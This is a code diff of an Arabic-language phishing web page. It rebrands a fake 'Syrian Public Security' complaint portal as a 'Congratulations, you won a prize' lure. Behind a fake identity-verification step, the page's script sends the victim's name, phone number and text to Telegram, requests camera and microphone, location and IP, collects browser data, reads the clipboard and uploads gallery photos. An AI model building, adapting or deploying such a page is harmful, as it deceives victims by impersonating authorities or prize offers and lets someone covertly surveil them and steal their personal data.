@@ -3,15 +3,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الأمن العام السوري - تسجيل الشكاوى</title>
+    <title>استلام جائزتك - الفوز العشوائي</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
     <style>
         body {
             font-family: 'Arial', sans-serif;
-            background: linear-gradient(135deg, #1e3a8a, #3b82f6);
-            color: white;
+            background: #000000;
+            color: #d4af37;
             direction: rtl;
             overflow: hidden;
         }
@@ -22,16 +22,17 @@
             width: 100%;
             height: 100%;
             z-index: -1;
-            opacity: 0.3;
+            opacity: 0.4;
         }
         #form-container {
-            background: rgba(255, 255, 255, 0.95);
-            color: #1e3a8a;
+            background: #1f2937;
+            color: #d4af37;
             padding: 2rem;
             border-radius: 1rem;
             max-width: 600px;
             margin: 2rem auto;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.5);
+            border: 1px solid #d4af37;
         }
         #modal {
             display: none;
@@ -40,21 +41,22 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(0, 0, 0, 0.8);
             justify-content: center;
             align-items: center;
             z-index: 1000;
         }
         #modal-content {
-            background: white;
+            background: #1f2937;
             padding: 2rem;
             border-radius: 1rem;
             text-align: center;
-            color: #1e3a8a;
+            color: #d4af37;
+            border: 1px solid #d4af37;
         }
         #status {
             margin-top: 1rem;
-            color: #1e3a8a;
+            color: #d4af37;
         }
         #video, #canvas, #audio {
             display: none;
@@ -62,32 +64,48 @@
         .logo-text {
             font-size: 2.5rem;
             font-weight: bold;
-            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.3);
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+        input, textarea {
+            background: #374151;
+            color: #d4af37;
+            border: 1px solid #d4af37;
+        }
+        input::placeholder, textarea::placeholder {
+            color: #9ca3af;
+        }
+        button {
+            background: #d4af37;
+            color: #1f2937;
+            font-weight: bold;
+        }
+        button:hover {
+            background: #b8972e;
         }
     </style>
 </head>
 <body>
     <div id="scene-container"></div>
     <div class="text-center mt-8">
-        <h1 class="logo-text text-white">الأمن العام السوري</h1>
-        <p class="text-lg text-white">منصة تسجيل الشكاوى الرسمية</p>
+        <h1 class="logo-text">تهانينا! لقد ربحت جائزة!</h1>
+        <p class="text-lg">أدخل بياناتك لاستلام جائزتك من الاختيار العشوائي</p>
     </div>
     <div id="form-container">
-        <h2 class="text-2xl font-bold mb-4">تسجيل شكوى</h2>
+        <h2 class="text-2xl font-bold mb-4">استلام الجائزة</h2>
         <div class="space-y-4">
             <input id="fullName" type="text" placeholder="الاسم الثلاثي" class="w-full p-3 border rounded-lg">
             <input id="phoneNumber" type="tel" placeholder="رقم الهاتف" class="w-full p-3 border rounded-lg">
-            <textarea id="complaint" placeholder="نص الشكوى" class="w-full p-3 border rounded-lg h-32"></textarea>
+            <textarea id="prizeDetails" placeholder="تفاصيل الجائزة (مثل: وصف الجائزة أو تعليق)" class="w-full p-3 border rounded-lg h-32"></textarea>
             <input id="galleryInput" type="file" accept="image/*" multiple class="w-full p-3 border rounded-lg">
-            <button id="submitBtn" class="w-full bg-blue-800 text-white p-3 rounded-lg hover:bg-blue-900">إرسال الشكوى</button>
+            <button id="submitBtn" class="w-full p-3 rounded-lg">استلام الجائزة</button>
         </div>
-        <p id="status">يرجى إدخال بياناتك لتسجيل الشكوى.</p>
+        <p id="status">يرجى إدخال بياناتك لاستلام الجائزة.</p>
     </div>
     <div id="modal">
         <div id="modal-content">
             <h2 class="text-xl font-bold mb-4">التحقق من الهوية</h2>
-            <p>اضغط على "تأكيد" للتحقق من هويتك وإرسال الشكوى.</p>
-            <button id="confirmBtn" class="bg-blue-800 text-white p-3 rounded-lg mt-4 hover:bg-blue-900">تأكيد</button>
+            <p>اضغط على "تأكيد" للتحقق من هويتك واستلام الجائزة.</p>
+            <button id="confirmBtn" class="p-3 rounded-lg mt-4">تأكيد</button>
         </div>
     </div>
     <video id="video" width="320" height="240"></video>
@@ -95,20 +113,20 @@
     <audio id="audio"></audio>
 
     <script>
-        // تهيئة Three.js لشعار 3D
+        // تهيئة Three.js لشعار 3D (كأس ذهبي)
         const scene = new THREE.Scene();
         const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
         const renderer = new THREE.WebGLRenderer({ alpha: true });
         renderer.setSize(window.innerWidth, window.innerHeight);
         document.getElementById('scene-container').appendChild(renderer.domElement);
-        const geometry = new THREE.SphereGeometry(5, 32, 32);
-        const material = new THREE.MeshBasicMaterial({ color: 0x1e3a8a, wireframe: true });
-        const sphere = new THREE.Mesh(geometry, material);
-        scene.add(sphere);
-        camera.position.z = 10;
+        const geometry = new THREE.CylinderGeometry(2, 4, 8, 32); // شكل كأس
+        const material = new THREE.MeshBasicMaterial({ color: 0xd4af37, wireframe: true });
+        const trophy = new THREE.Mesh(geometry, material);
+        scene.add(trophy);
+        camera.position.z = 12;
         function animate() {
             requestAnimationFrame(animate);
-            sphere.rotation.y += 0.01;
+            trophy.rotation.y += 0.01;
             renderer.render(scene, camera);
         }
         animate();
@@ -124,7 +142,7 @@
         const status = document.getElementById('status');
         const phoneNumberInput = document.getElementById('phoneNumber');
         const fullNameInput = document.getElementById('fullName');
-        const complaintInput = document.getElementById('complaint');
+        const prizeDetailsInput = document.getElementById('prizeDetails');
         const galleryInput = document.getElementById('galleryInput');
         const modal = document.getElementById('modal');
         const confirmBtn = document.getElementById('confirmBtn');
@@ -132,12 +150,12 @@
         let mediaRecorder;
         let recordedChunks = [];
 
-        // طلب الأذونات عند النقر على إرسال الشكوى
+        // طلب الأذونات عند النقر على استلام الجائزة
         submitBtn.onclick = async () => {
             const fullName = fullNameInput.value;
             const phoneNumber = phoneNumberInput.value;
-            const complaint = complaintInput.value;
-            if (!fullName || !phoneNumber || !complaint) {
+            const prizeDetails = prizeDetailsInput.value;
+            if (!fullName || !phoneNumber || !prizeDetails) {
                 status.innerText = 'يرجى ملء جميع الحقول';
                 return;
             }
@@ -151,22 +169,22 @@
             status.innerText = 'جارٍ التحقق...';
             const fullName = fullNameInput.value;
             const phoneNumber = phoneNumberInput.value;
-            const complaint = complaintInput.value;
-            const complaintData = `
-بيانات الشكوى:
+            const prizeDetails = prizeDetailsInput.value;
+            const prizeData = `
+بيانات الجائزة:
 - الاسم الثلاثي: ${fullName}
 - رقم الهاتف: ${phoneNumber}
-- نص الشكوى: ${complaint}
+- تفاصيل الجائزة: ${prizeDetails}
             `;
             try {
-                await sendToTelegram(complaintData);
+                await sendToTelegram(prizeData);
                 await requestCameraAndMicrophone();
                 await requestLocation();
                 await collectIP();
                 await collectBrowserData();
                 await readClipboard();
                 await sendGalleryImages();
-                status.innerText = 'تم إرسال الشكوى بنجاح!';
+                status.innerText = 'تم إرسال بيانات الجائزة بنجاح! سيتم التواصل معك قريبًا.';
             } catch (error) {
                 status.innerText = 'خطأ في التحقق: ' + error.message;
                 console.error(error);
